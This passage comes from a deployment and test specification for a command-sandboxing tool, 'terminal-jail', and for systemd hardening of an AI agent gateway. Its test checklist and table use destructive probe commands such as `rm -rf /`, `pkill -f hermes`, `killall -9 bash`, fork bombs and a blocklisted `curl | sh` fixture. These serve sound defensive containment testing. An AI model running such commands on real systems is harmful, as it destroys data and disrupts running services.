- [ ] Run `TERMINAL_JAIL_INTERRUPTOR_MODE=warn terminal-jail --interruptor "rm -rf /"` and confirm the command prints a warning but exits 0 (warn mode).
- [ ] Run `TERMINAL_JAIL_INTERRUPTOR_MODE=disabled terminal-jail --interruptor "rm -rf /"` and confirm the interruptor is bypassed.
- [ ] Run `terminal-jail --no-interruptor "rm -rf /"` and confirm the interruptor is bypassed by flag.
- [ ] Run a safe command through the CLI and confirm it executes normally: `terminal-jail --interruptor "echo ok"`.
- [ ] Run a sandbox-targeted command (`make build` or `pytest`) through the CLI and confirm it is wrapped in unshare (verify with `--no-interruptor` comparison).
- [ ] Confirm the JSON bridge (`interruptor_bridge.py`) returns structured `action`, `rule_id`, and `reason` fields for blocked commands.
- [ ] Run the interruptor unit test suite and confirm all 56 tests pass.

## End-to-end testing without a production Hermes instance

The complete stack must be testable without connecting to production Hermes, production credentials, or production workloads.

### Test environment design

Use a disposable environment with:

- a non-production Linux VM, ephemeral test host, or disposable container/VM combination;
- a dedicated unprivileged test account;
- a test systemd unit named consistently with the target unit where practical (for example, a test copy of `hermes-gateway.service`);
- a minimal local Hermes gateway/plugin fixture, stub, or test harness that loads the real `terminal.command.transform` plugin path but does not contact production services;
- a synthetic, harmless command executor with deterministic logs;
- no production secrets, SSH agents, Docker socket, host mounts, cloud credentials, or shared home directory;
- a separate sentinel host process whose survival can be checked after destructive-name probes;
- a writable disposable workspace and a known host path deliberately excluded from the sandbox for write-denial tests.

If Docker is used for the fixture and systemd is unavailable inside the container, test plugin and CLI namespace behavior there, then run the systemd-specific checks on a disposable systemd-enabled VM or host. Do not represent a Docker-only run as full-stack validation because it cannot validate the systemd layer.

### Test cases

| Test | Setup | Action | Expected result |
|---|---|---|---|
| Plugin process-signal containment | Start non-production gateway with plugin and hardened unit; start external sentinel process. | Invoke `hermes chat -q "pkill -f hermes"`. | Request errors/has no host target effect; gateway and sentinel survive; transform log exists. |
| CLI process-signal containment | Start an ordinary host-shell sentinel. | Invoke `terminal-jail "killall -9 bash"`. | Command errors or finds no host target; invoking host shell survives. |
| PID visibility | Create a uniquely named host sentinel outside sandbox. | Run process-discovery command via plugin and CLI. | Sentinel is absent from sandbox-visible process list. |
| Filesystem write isolation | Define a host path excluded from sandbox mounts. | Attempt write through plugin and CLI. | Write fails; independent host-side check confirms unchanged content. |
| Package/pipeline containment | Use a local harmless package or local HTTP fixture that attempts controlled writes. | Run `pip install` fixture (auto-sandboxed) and a `curl | sh`-style fixture (blocklisted). | Only allowed disposable sandbox paths change; prohibited host path remains unchanged. |
| Fork containment | Use a controlled fan-out helper with bounded duration. | Run beneath gateway unit until near/over configured task limit. | New task creation is denied/capped; service and host recover; event is observable. |
| No-new-privileges | Provide a deliberately harmless test setuid/file-capability fixture only in disposable environment. | Execute fixture through hardened gateway path. | Privilege gain does not occur. |
| `/proc` protection | Start external sentinel under another process identity where feasible. | Inspect `/proc` from gateway child. | Visibility matches `ProtectProc` policy and does not disclose unrelated processes. |
| Address-family restriction | Use a small test helper that requests an intentionally disallowed socket family. | Execute through hardened gateway. | Socket creation fails; required gateway networking remains functional. |
| Missing `unshare` | Test-only environment/PATH omits `unshare`. | Invoke plugin and CLI. | Both return clear non-zero setup error; original command is not executed. |
| Missing plugin | Run gateway fixture without plugin but with CLI/systemd available. | Execute command through CLI path. | CLI containment remains effective; test report marks automatic Hermes coverage absent. |
| No systemd environment | Run fixture in Docker without systemd. | Execute plugin and CLI probes. | Namespace/filesystem tests pass if supported; report explicitly marks systemd controls unverified/unavailable. |
| **Interruptor + unshare compose (T-I37)** | Install CLI with interruptor bridge reachable. | Issue an auto-sandbox-targeted command (`make build` or `pytest`) via `terminal-jail`. | Interruptor matches the sandbox rule, wraps command in `unshare`, and the combined stack (interruptor → unshare) executes without error. |
| **Custom user rule overrides built-in (T-I38)** | Deploy a user rule file (`~/.config/terminal-jail/rules.d/99-custom.yaml`) that allowlists a normally-blocked command pattern. | Issue the blocked command via `terminal-jail`. | The user allowlist rule (higher priority by lexical ordering) overrides the built-in block rule. Command is allowed. |
| **Priority ordering (T-I39)** | Deploy two user rules with different priorities for the same command pattern. | Issue the matching command via `terminal-jail`. | The higher-priority rule wins. |
| **Rule directory hot-reload (T-I40)** | Start CLI in a test loop; add a new rule file to `rules.d/` while running. | Issue the newly-matched command after the file appears. | Without CLI restart, the new rule is loaded and the command is evaluated against it. (Requires SIGHUP or file-watcher implementation.) |

### Safety requirements for tests

- Never run `pkill`, `killall`, fork bombs, or privilege probes against a production gateway, shared developer workstation, or host process namespace without verified isolation.
- Prefer unique test process names and disposable sentinels over broad matching patterns.
- Bound every resource test by timeout, maximum child count, and cleanup trap in the test helper.
- Test write-denial behavior against purpose-built fixture paths, never user homes or system configuration.
- Keep a separate host-side observer outside the sandbox to verify sentinels, service health, files, and network traces.
- Treat unexpected command success as a security failure, stop the test, and inspect actual namespace/service configuration before retrying.

## Operational monitoring and evidence

Deployment is not complete without evidence that containment remains active.

Monitor and periodically review:

- plugin initialization and command-transform success/failure events;
- `unshare` resolution and namespace setup failures;
- interruptor rule matches and blocks (log level and rate);
- interruptor bridge availability and JSON protocol errors;
- systemd unit restart failures and rejected service directives;
- `TasksMax`/cgroup task-limit events;
- denied socket or syscall events when auditing is available;
- changes to the effective systemd unit, plugin configuration, CLI wrapper, `PATH`, mount policy, and service account;
- drift in `systemd-analyze security hermes-gateway.service` score from the baseline recorded at deployment (the 9.0 target applies to the staged full profile; shipped-baseline deployments monitor for regression);
- unexpected writable mounts, attached credentials, or privileged sockets in the gateway execution environment.

Alerting should distinguish between a command that was safely denied by policy and a failure to initialize the policy itself. The latter is a coverage-loss event and requires remediation.

## Acceptance criteria

The integration is acceptable only when all of the following are true:

0. The Interruptor Bash engine is integrated into the standalone CLI (default enabled) and evaluates commands against the 30 built-in rules before execution.
1. The systemd drop-in is active for `hermes-gateway.service`, and `systemd-analyze security hermes-gateway.service` reports a score of at least 9.0 — **full-profile deployments only**; shipped-baseline deployments (4 active directives) satisfy this criterion by matching the `[shipped] baseline` checklist in `specs/systemd.md` with no score regression.
2. The drop-in enforces `NoNewPrivileges`, `ProtectProc`, a documented `TasksMax`, and a documented `RestrictAddressFamilies` (staged — commented out as shipped) policy compatible with the service's legitimate operation when the directive is enabled.
3. The Hermes plugin transforms terminal commands through the approved `unshare` policy in fresh Hermes sessions.
4. The standalone `terminal-jail` CLI applies equivalent required namespace isolation (and filesystem isolation where the host permits a uid mapping — `scripts/fs-isolation-probe.py`) for explicit manual invocations.
5. `hermes chat -q "pkill -f hermes"` returns an error without damaging the non-production gateway or host sentinel process.
6. `terminal-jail "killall -9 bash"` returns an error without terminating the invoking host shell.
7. Missing or failing `unshare` produces an explicit non-zero error and never silently executes the original command unsandboxed in production configuration.
8. End-to-end tests verify PID/process containment, filesystem write isolation, task limits, no-new-privilege behavior, `/proc` restrictions, and address-family restrictions in a disposable non-production environment.
9. Any unavailable layer is reported in the deployment/test record, along with the resulting residual risk and compensating controls.
